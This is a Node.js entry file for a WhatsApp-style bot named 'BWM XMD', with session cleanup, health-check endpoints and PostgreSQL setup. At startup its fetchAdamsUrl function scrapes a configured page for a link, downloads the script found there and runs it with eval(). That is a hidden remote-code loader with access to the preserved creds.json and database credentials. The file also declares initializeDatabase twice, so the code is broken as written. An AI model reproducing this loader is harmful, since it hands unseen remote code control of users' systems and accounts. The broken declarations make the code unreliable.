//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { Pool } = require('pg'); // Added for PostgreSQL interaction
const { initializeDatabase } = require('./Ibrahim/api/db'); // Assuming this file will contain DB setup

// Function to clear session data
function clearSessionData() {
  const sessionDir = path.join(__dirname, 'Session');

  if (fs.existsSync(sessionDir)) {
    const files = fs.readdirSync(sessionDir);

    for (const file of files) {
      if (file !== 'creds.json') { // Preserve credentials file
        const filePath = path.join(sessionDir, file);
        try {
          fs.unlinkSync(filePath);
          console.log(`Cleared session file: ${file}`);
        } catch (err) {
          console.error(`Error clearing file ${file}:`, err);
        }
      }
    }
    console.log('Session data cleared successfully');
  }
}

// Clear session data before starting
clearSessionData();
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

// Configure port for scale-to-zero support
const PORT = process.env.PORT || 8080;
const http = require('http');
const express = require('express');
const app = express();

// Health check endpoints for scale-to-zero
app.get('/', (req, res) => {
  res.status(200).send('BWM XMD Bot Status: Online');
});

app.get('/health', (req, res) => {
  const status = {
    status: 'healthy',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    bot: global.xmd && global.xmd.user ? 'connected' : 'disconnecting'
  };
  res.status(200).json(status);
});

// Ready check for scale-to-zero
app.get('/ready', (req, res) => {
  if (global.xmd && global.xmd.user) {
    res.status(200).json({ ready: true });
  } else {
    res.status(503).json({ ready: false });
  }
});
const server = http.createServer(app);
server.listen(PORT, '0.0.0.0', () => {
  console.log(`BWM XMD Bot Server running on port ${PORT}`);
});

// Keep-alive ping every 5 minutes
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    console.log("Bot connection active");
  }
}, 300000);

// Add keep-alive ping to prevent premature scaling to zero
setInterval(() => {
  if (global.xmd && global.xmd.user) {
    console.log("Bot is alive and connected");
  }
}, 45000);

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

// Placeholder for database connection details (replace with your actual credentials)
const SM_DB = process.env.DATABASE_URL || 'postgres://user:password@host:port/database'; //  Needs to be set appropriately.
const pool = new Pool({ connectionString: SM_DB });


async function initializeDatabase() {
    try {
        await pool.query(`CREATE TABLE IF NOT EXISTS claims (
            user_id TEXT NOT NULL,
            link TEXT NOT NULL,
            claim_time TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
        );`);
        console.log('Database initialized successfully.');
    } catch (error) {
        console.error('Error initializing database:', error);
    }
}


async function startBwm() {
  await initializeDatabase();
  fetchAdamsUrl();
}

startBwm();